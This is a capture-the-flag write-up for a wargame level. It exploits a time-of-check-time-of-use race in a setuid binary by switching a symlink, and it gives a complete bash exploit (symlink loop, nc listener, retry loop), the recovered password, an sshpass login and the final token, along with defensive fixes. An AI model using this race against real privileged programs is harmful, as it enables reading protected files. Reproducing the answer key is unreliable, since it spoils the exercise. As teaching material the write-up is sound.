# Level 10 Solution: TOCTOU Race Condition

## Vulnerability
The `level10` binary has a **Time-of-Check-Time-of-Use (TOCTOU)** vulnerability:

1. Calls `access()` to check if current user has read permission
2. Calls `open()` and `read()` to read the file
3. Sends file contents over network

This creates a race condition window between the two syscalls where an attacker can change what file is being accessed.

## Vulnerability Details

**The Race Condition:**
```c
// VULNERABLE CODE PATTERN:
if (access(filename, R_OK) == 0) {     // Check: Is file readable?
    // ... time window here ...        // TOCTOU RACE!
    fd = open(filename, O_RDONLY);    // Use: Open the file
    read(fd, buffer, size);           // Read the file
}
```

An attacker can:
1. Create a symlink to a readable file
2. Pass the `access()` check
3. Quickly switch the symlink to point to a restricted file
4. If the binary runs as setuid, it can now read files the attacker can't

## Exploit Strategy

By rapidly switching a symlink target between the check and use:
1. Pass the `access()` check with a readable file
2. Switch symlink to restricted file before `open()` call
3. Since `level10` is setuid flag10, it reads files flag10 can read
4. Read `/home/user/level10/.bash_history` to find flag10 password

## Attack Implementation

### Step 1: Set Up Directories and Files
```bash
cd /var/tmp
rm -f link dummy /tmp/captured

echo "dummy" > dummy
ln -s dummy link
```

Create a symlink to a readable dummy file that will pass the access() check.

### Step 2: Start Network Listener
```bash
timeout 300 nc -l -p 6969 > /tmp/captured 2>/dev/null &
LISTENER_PID=$!
sleep 0.1
```

The binary sends the file contents to port 6969. We capture the output.

### Step 3: Run Race Condition Loop
Start a background process that continuously switches the symlink target:

```bash
(while true; do ln -sf /home/user/level10/.bash_history link 2>/dev/null; done) &
SWITCHER_PID=$!
```

This runs thousands of times per second, trying to switch the symlink.

### Step 4: Execute Binary in Loop
Run the level10 binary repeatedly:

```bash
for attempt in {1..1000}; do
  ln -sf dummy link 2>/dev/null           # Reset symlink to readable file
  /home/user/level10/level10 link 127.0.0.1 >/dev/null 2>&1 &

  # Switcher process tries to change symlink during this execution
  wait $! 2>/dev/null

  # Check if we captured enough data
  if [ -s /tmp/captured ]; then
    SIZE=$(wc -c < /tmp/captured 2>/dev/null || echo 0)
    if [ $SIZE -gt 500 ]; then
      kill $SWITCHER_PID $LISTENER_PID 2>/dev/null
      cat /tmp/captured
      exit 0
    fi
  fi
done
```

**Why This Works:**
1. Symlink is reset to dummy (readable) for access() check
2. Switcher process races to change symlink to .bash_history
3. Binary with flag10 privileges opens the symlink
4. If switcher won ahead, symlink now points to bash_history
5. Binary reads the file with its elevated privileges
6. Contents are sent to network listener

### Step 5: Extract Password from Captured Data
The captured bash history contains:
```
woupa2yuojeeaaed06riuj63c
```

This is the flag10 password.

### Step 6: Access flag10 and Get Flag
```bash
sshpass -p "woupa2yuojeeaaed06riuj63c" ssh -o StrictHostKeyChecking=no -p 4242 flag10@localhost getflag
```

### Step 7: Extract Token
```
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

## Race Condition Timing

The race window is very small (microseconds), but:
- We run 1000+ attempts
- Switcher runs ~1000 changes per second
- With enough iterations, we eventually win the race
- Success rate increases with more attempts

## Defense Mechanisms

Proper defenses against TOCTOU:

1. **Use `open()` with O_NOFOLLOW flag:**
   ```c
   fd = open(filename, O_RDONLY | O_NOFOLLOW);
   ```
   Prevents symlink following entirely.

2. **Use `fstat()` instead of separate checks:**
   ```c
   fd = open(filename, O_RDONLY);
   if (fstat(fd, &stat_buf) == 0) {
       // Check permissions on already-open file
   }
   ```

3. **Avoid separate access() checks:**
   - Let open() handle permission checks atomically
   - No time window between check and use

## Answer

- **Flag10 Password**: `woupa2yuojeeaaed06riuj63c` (from .bash_history via TOCTOU)
- **Level10 Token**: `feulo4b72j7edeahuete3no7c`
- **Vulnerability Type**: Time-of-Check-Time-of-Use (TOCTOU) race condition
- **Impact**: Read arbitrary files (flag10-readable) via symlink switching race
